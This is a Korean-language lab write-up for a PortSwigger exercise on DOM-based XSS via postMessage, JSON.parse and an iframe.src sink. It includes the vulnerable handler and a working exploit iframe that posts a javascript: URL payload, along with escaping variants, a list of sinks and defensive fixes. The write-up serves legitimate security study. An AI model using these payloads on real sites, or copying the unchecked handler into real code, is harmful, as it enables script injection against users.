# Lab: DOM XSS using web messages and JSON.parse

## 개요

- **난이도**: Apprentice  
- **주제**: DOM-based XSS — web messages / postMessage / JSON.parse / iframe src 싱크
- **링크**: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse

## 목표

메시지 핸들러가 수신 데이터를 `JSON.parse()` 로 파싱한 뒤, 특정 `type` 에 따라 iframe `src` 에 URL 을 설정하는 구조를 이용한다. JSON 형식에 맞는 페이로드로 `javascript:` URL 을 iframe src 에 주입하여 XSS 를 실행한다.

## 이전 랩들과의 차이

```
[001 랩]
  수신: 문자열 그대로
  싱크: innerHTML
  페이로드: <img src=1 onerror=print()>

[002 랩]
  수신: 문자열 그대로
  싱크: location.href
  페이로드: javascript:print()//https:

[003 랩 (이번)]
  수신: JSON 문자열 → JSON.parse() 파싱
  싱크: iframe.src  (파싱된 객체의 url 속성)
  페이로드: {"type":"load-channel","url":"javascript:print()"}
  차이: 페이로드가 유효한 JSON 형식이어야 함
```

## 취약한 메시지 핸들러

```javascript
// 타겟 사이트의 취약한 코드
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe');
    var ACMEplayer = {element: iframe};
    document.body.appendChild(iframe);

    var d;
    try {
        d = JSON.parse(e.data);  // JSON 파싱
    } catch(e) {
        return;  // 파싱 실패 시 종료 → 반드시 유효한 JSON 이어야 함
    }

    switch(d.type) {
        case "load-channel":
            ACMEplayer.element.src = d.url;  // ← 싱크! javascript: 허용
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width  = d.width  + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
});
```

```
취약점:
  1. origin 검증 없음 → 외부 메시지 처리
  2. d.url 을 iframe.src 에 그대로 설정
     → javascript: URL 설정 가능
     → iframe 내에서 JS 실행
  3. JSON.parse 성공 조건만 있고 값 검증 없음
```

## iframe.src 의 XSS 싱크 특성

```javascript
// iframe.src 에 javascript: URL 설정 시
iframe.src = 'javascript:print()';
// → iframe 내부에서 print() 실행

// location.href 와 동일한 동작:
location.href = 'javascript:alert(1)';  // 현재 창에서 실행
iframe.src    = 'javascript:alert(1)';  // iframe 안에서 실행

// 일반 URL:
iframe.src = 'https://example.com';  // 페이지 로드
iframe.src = 'javascript:...';       // JS 코드 실행
```

## 공격 방법

### 페이로드 구성

```json
{
  "type": "load-channel",
  "url": "javascript:print()"
}
```

```
JSON 형식 요건:
  - 큰따옴표 사용 (작은따옴표 불가)
  - type 값이 "load-channel" 이어야 switch 분기 진입
  - url 값에 javascript: URL 삽입
```

### 최종 exploit 페이로드

```html
<iframe
  src="https://VULNERABLE.com/"
  onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'
></iframe>
```

```
JSON 이스케이프 주의:
  HTML 속성(onload)이 작은따옴표로 감싸여 있으므로
  내부 큰따옴표는 \" 로 이스케이프

  또는 HTML 엔티티 사용:
  onload="this.contentWindow.postMessage('{&quot;type&quot;:&quot;load-channel&quot;,&quot;url&quot;:&quot;javascript:print()&quot;}','*')"
```

### 실행 흐름

```
1. iframe 으로 타겟 페이지 로드
2. onload 발화 → postMessage 전송:
   data: '{"type":"load-channel","url":"javascript:print()"}'
3. 타겟 핸들러:
   d = JSON.parse(data)
   → {type: "load-channel", url: "javascript:print()"}
   d.type === "load-channel" → switch 분기 진입
   ACMEplayer.element.src = "javascript:print()"
4. iframe src 에 javascript: URL 설정 → print() 실행
```

## 001~003 랩 종합 비교

| 항목 | 001 | 002 | 003 (이번) |
|------|-----|-----|-----------|
| 수신 형식 | 문자열 | 문자열 | JSON 문자열 |
| 파싱 | 없음 | 없음 | `JSON.parse()` |
| 싱크 | `innerHTML` | `location.href` | `iframe.src` |
| 페이로드 형식 | HTML 태그 | `javascript:` URL | JSON + `javascript:` URL |
| 추가 검증 | 없음 | http/https 포함 여부 | JSON 유효성만 (값 검증 없음) |
| 우회 기법 | 없음 | JS 주석 `//https:` | JSON 형식 준수 |

## 핵심 정리

- `JSON.parse()` 로 메시지를 파싱해도, 파싱된 **값에 대한 검증이 없으면** 여전히 취약하다.
- `iframe.src` 도 `location.href` 와 마찬가지로 `javascript:` URL 을 받으면 JS 를 실행하는 싱크다.
- JSON 형식 자체는 보안과 무관하다 — 형식이 올바른 악성 페이로드도 얼마든지 가능하다.
- **방어**:
  - `event.origin` 검증
  - `d.url` 을 설정 전 URL 스킴 검증 (`new URL(d.url).protocol !== 'javascript:'`)
  - `javascript:` 스킴 명시적 차단

## 배운 점 및 추가 학습

### 1. JSON.parse 와 보안

```javascript
// JSON.parse 는 형식 검증만 할 뿐, 값 검증은 하지 않음
JSON.parse('{"url":"javascript:alert(1)"}')
// → {url: "javascript:alert(1)"}  ← 파싱 성공, 악성 값 그대로

// JSON 파싱 성공 ≠ 안전한 데이터
// 파싱 후 각 필드 값에 대한 별도 검증 필수

// 안전한 처리:
const d = JSON.parse(e.data);
const allowedTypes = ['load-channel', 'player-height-changed'];
if (!allowedTypes.includes(d.type)) return;

// URL 검증:
const url = new URL(d.url);
if (!['http:', 'https:'].includes(url.protocol)) return;
iframe.src = d.url;
```

### 2. XSS 싱크로 동작하는 속성들

```javascript
// javascript: URL 을 받으면 JS 실행되는 싱크:
element.src              // <iframe>, <img>, <script> 등
element.href             // <a>, <link>
location.href            // 현재 창 이동
location.assign(url)
location.replace(url)
window.open(url)

// HTML 삽입 싱크:
element.innerHTML
element.outerHTML
document.write()
document.writeln()

// JS 직접 실행 싱크:
eval()
setTimeout('코드문자열')
setInterval('코드문자열')
new Function('코드문자열')
```

### 3. JSON 페이로드 이스케이프 방법

```javascript
// postMessage 에 JSON 전달 시 이스케이프 처리

// 방법 1: JSON.stringify 사용 (권장)
const payload = JSON.stringify({
    type: "load-channel",
    url: "javascript:print()"
});
iframe.contentWindow.postMessage(payload, '*');

// 방법 2: 수동 이스케이프
// onload 속성이 작은따옴표로 감싸인 경우:
onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'

// 방법 3: HTML 엔티티 (onload 가 큰따옴표로 감싸인 경우):
onload="this.contentWindow.postMessage('{&quot;type&quot;:&quot;load-channel&quot;,&quot;url&quot;:&quot;javascript:print()&quot;}','*')"
```

### 4. postMessage 기반 DOM XSS 탐지 포인트

```
코드 리뷰 시 위험 패턴:

addEventListener('message', ...) 가 있으면 확인:
  1. event.origin 검증 여부
     → 없으면 외부 공격 가능

  2. event.data 처리 방법
     → JSON.parse 후 필드 사용 여부
     → 문자열 직접 사용 여부

  3. 사용되는 싱크
     → innerHTML, location.href, iframe.src, eval 등
     → 위 싱크에 event.data (또는 파싱된 값) 가 도달하면 취약
```
